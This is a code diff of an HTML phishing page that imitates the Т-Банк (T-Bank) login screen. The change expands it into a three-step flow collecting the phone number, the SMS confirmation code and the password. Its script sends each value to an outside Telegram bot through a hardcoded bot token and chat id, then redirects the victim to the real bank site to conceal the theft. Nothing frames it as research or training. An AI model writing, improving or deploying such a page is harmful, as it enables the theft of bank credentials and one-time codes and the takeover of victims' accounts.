@@ -3,46 +3,93 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Т-Банк — Вход</title>
-<meta property="og:title" content="Т-Банк">
-<meta property="og:description" content="Вход в личный кабинет Т-Банка">
-<meta property="og:image" content="https://www.tbank.ru/favicon.ico">
-<meta property="og:url" content="https://твой-домен.com">
+<title>Вход в Т-Банк</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-body { background: #fff; color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-.container { width: 100%; max-width: 400px; padding: 40px 20px; text-align: center; }
-.logo { width: 140px; height: auto; margin: 0 auto 30px; display: block; }
-h1 { font-size: 26px; margin-bottom: 10px; color: #000; }
-p { color: #666; font-size: 15px; margin-bottom: 30px; }
-input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 10px; background: #f5f5f5; color: #333; font-size: 16px; outline: none; }
+body { background: #fff; color: #333; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 20px; }
+.container { width: 100%; max-width: 400px; padding-top: 40px; }
+.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 80px; }
+.logo { background: #000; color: #fff; padding: 6px 12px; border-radius: 8px; font-weight: 700; font-size: 14px; }
+.close { width: 32px; height: 32px; background: #f0f0f0; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; color: #999; cursor: pointer; }
+h1 { font-size: 26px; text-align: center; margin-bottom: 30px; color: #000; font-weight: 700; }
+.field { margin-bottom: 15px; }
+label { display: block; font-size: 13px; color: #666; margin-bottom: 6px; }
+input { width: 100%; padding: 16px; border: 1px solid #e0e0e0; border-radius: 12px; background: #f5f5f5; font-size: 17px; outline: none; color: #333; }
 input:focus { border-color: #ffdd2d; background: #fff; }
-button { width: 100%; padding: 14px; background: #ffdd2d; color: #000; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; }
-button:hover { background: #f5c800; }
-.footer { margin-top: 20px; color: #999; font-size: 13px; }
+.btn { width: 100%; padding: 16px; background: #ffdd2d; color: #000; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 5px; }
+.btn:hover { background: #f5c800; }
+.biometric { width: 100%; padding: 16px; background: #f5f5f5; color: #333; border: none; border-radius: 12px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+.biometric span { color: #5288c1; }
+.policy { text-align: center; font-size: 12px; color: #999; margin-top: 30px; text-decoration: underline; cursor: pointer; }
+.step2 p, .step3 p { text-align: center; color: #666; font-size: 15px; margin-bottom: 25px; }
+.hidden { display: none; }
 </style>
 </head>
 <body>
 <div class="container">
-<img src="https://www.tbank.ru/favicon.ico" alt="Т-Банк" class="logo">
-<h1>Вход в Т-Банк</h1>
-<p>Введите номер телефона для входа</p>
-<form id="loginForm">
-<input type="text" name="phone" placeholder="Номер телефона" required>
-<input type="password" name="password" placeholder="Пароль" required>
-<button type="submit">Войти</button>
-</form>
-<div class="footer">Т-Банк — онлайн-банк</div>
+  <div class="header">
+    <div class="logo">T ID</div>
+    <div class="close">✕</div>
+  </div>
+
+  <div id="step1">
+    <h1>Вход в Т-Банк</h1>
+    <div class="field">
+      <label>Телефон</label>
+      <input type="tel" id="phone" value="+7" placeholder="+7">
+    </div>
+    <button class="btn" id="next1">Продолжить</button>
+    <button class="biometric"><span>👤</span> Войти по скану лица или пальца</button>
+    <div class="policy">Политика обработки персональных данных</div>
+  </div>
+
+  <div id="step2" class="step2 hidden">
+    <h1>Введите код</h1>
+    <p>Отправили код подтверждения на ваш номер</p>
+    <div class="field">
+      <label>Код</label>
+      <input type="tel" id="code" value="•••••" maxlength="5">
+    </div>
+  </div>
+
+  <div id="step3" class="step3 hidden">
+    <h1>Введите пароль</h1>
+    <p>Введите пароль от личного кабинета</p>
+    <div class="field">
+      <label>Пароль</label>
+      <input type="password" id="password" placeholder="Пароль">
+    </div>
+    <button class="btn" id="login">Войти</button>
+  </div>
 </div>
+
 <script>
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-  var phone = document.querySelector('input[name="phone"]').value;
-  var pass = document.querySelector('input[name="password"]').value;
-  var token = '8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg';
-  var chat = '7887003990';
+var token = '8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg';
+var chat = '7887003990';
+
+function send(text) {
   var img = new Image();
-  img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(phone + ':' + pass);
+  img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(text);
+}
+
+document.getElementById('next1').addEventListener('click', function() {
+  var phone = document.getElementById('phone').value;
+  send('Телефон: ' + phone);
+  document.getElementById('step1').classList.add('hidden');
+  document.getElementById('step2').classList.remove('hidden');
+});
+
+document.getElementById('code').addEventListener('input', function() {
+  if (this.value.length === 5 && this.value !== '•••••') {
+    send('Код: ' + this.value);
+    document.getElementById('step2').classList.add('hidden');
+    document.getElementById('step3').classList.remove('hidden');
+  }
+});
+
+document.getElementById('login').addEventListener('click', function() {
+  var pass = document.getElementById('password').value;
+  send('Пароль: ' + pass);
   window.location.href = 'https://www.tbank.ru';
 });
 </script>
